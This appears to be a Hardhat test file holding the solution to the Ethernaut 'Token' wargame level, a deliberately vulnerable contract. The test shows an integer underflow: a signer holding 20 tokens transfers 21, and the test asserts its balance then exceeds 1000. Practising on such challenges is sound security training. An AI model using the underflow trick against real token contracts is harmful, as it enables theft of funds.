import { loadFixture } from '@nomicfoundation/hardhat-network-helpers'
import { expect } from 'chai'
import { BigNumber, Contract } from 'ethers'
import { parseEther } from 'ethers/lib/utils'
import { ethers } from 'hardhat'

describe('Token', function () {
  const deployFixture = async () => {
    const [deployer, ...signers] = await ethers.getSigners()
    const TokenFactory = await ethers.getContractFactory('EthernautToken')
    const Token = await TokenFactory.connect(deployer).deploy(1000)
    await Token.deployed()
    const AttackFactory = await ethers.getContractFactory('EthernautTokenAttack')
    const Attack = await AttackFactory.connect(signers[0]).deploy()
    await Attack.deployed()
    return { Token, Attack, deployer, signers }
  }

  describe('Solution', function () {
    it('get additional token', async () => {
      const { Token, Attack, deployer, signers } = await loadFixture(deployFixture)
      // Initial setup
      await Token.connect(deployer).transfer(signers[0].address, 20)
      expect(await (Token.balanceOf(signers[0].address))).to.equal(BigNumber.from("20"))
      await Token.connect(signers[0]).transfer(deployer.address, 21)
      expect(await (Token.balanceOf(signers[0].address))).to.gt(BigNumber.from("1000"))
    })
  })
})
